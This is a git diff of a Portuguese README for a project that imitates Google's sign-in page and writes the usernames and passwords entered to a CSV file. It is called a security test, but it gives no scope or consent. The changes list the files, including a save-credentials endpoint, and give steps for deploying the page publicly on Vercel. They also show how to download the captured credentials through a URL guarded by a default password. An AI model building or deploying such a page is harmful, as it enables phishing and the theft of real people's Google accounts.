@@ -2,17 +2,39 @@
 
 Sistema de teste de segurança que simula a tela de login do Google e salva as credenciais em CSV.
 
+## Estrutura do Projeto
+
+```
+.
+├── front/          # Frontend (HTML, CSS, JS)
+│   ├── index.html
+│   ├── style.css
+│   └── script.js
+├── server/         # Backend (Node.js/Express)
+│   ├── server.js
+│   ├── api/        # API endpoints (Vercel serverless)
+│   │   ├── save-credentials.js
+│   │   ├── download-csv.js
+│   │   ├── status.js
+│   │   └── index.js
+│   └── package.json
+├── package.json    # Dependências do projeto
+└── vercel.json     # Configuração Vercel
+```
+
 ## Instalação
 
 1. Instale as dependências:
 ```bash
 npm install
+cd server && npm install
 ```
 
-## Como usar
+## Como usar localmente
 
 1. Inicie o servidor:
 ```bash
+cd server
 npm start
 ```
 
@@ -23,51 +45,24 @@ http://localhost:3000
 
 3. As credenciais serão salvas automaticamente no arquivo `credentials.csv`
 
-## Estrutura
-
-- `index.html` - Interface da tela de login
-- `style.css` - Estilos CSS
-- `script.js` - Lógica do frontend
-- `server.js` - Servidor backend Node.js
-- `credentials.csv` - Arquivo onde as credenciais são salvas (criado automaticamente)
-
 ## Deploy na Vercel
 
-### Opção 1: Via CLI
-```bash
-# Instalar Vercel CLI
-npm install -g vercel
+1. Faça push para o GitHub
+2. A Vercel detectará automaticamente as configurações
+3. O frontend será servido via `server/api/index.js`
+4. As APIs estarão disponíveis em `/api/*`
 
-# Fazer login
-vercel login
+## Acessar as credenciais salvas
 
-# Deploy
-vercel
-
-# Deploy em produção
-vercel --prod
-```
-
-### Opção 2: Via GitHub
-1. Faça push do código para o GitHub
-2. Acesse [vercel.com](https://vercel.com)
-3. Importe o repositório
-4. A Vercel detectará automaticamente as configurações
-
-### Acessar o CSV
-
-Na Vercel, o arquivo CSV é salvo em `/tmp`. Para baixar:
-
+Após o deploy, você pode baixar o CSV acessando:
 ```
 https://seu-projeto.vercel.app/api/download-csv?password=senha123
 ```
 
-⚠️ **IMPORTANTE**: Configure uma senha segura usando variável de ambiente:
+**Para mudar a senha**, configure uma variável de ambiente na Vercel:
 ```bash
 vercel env add DOWNLOAD_PASSWORD
 ```
-
-Veja mais detalhes em `DEPLOY.md`
 
 ## Segurança
 
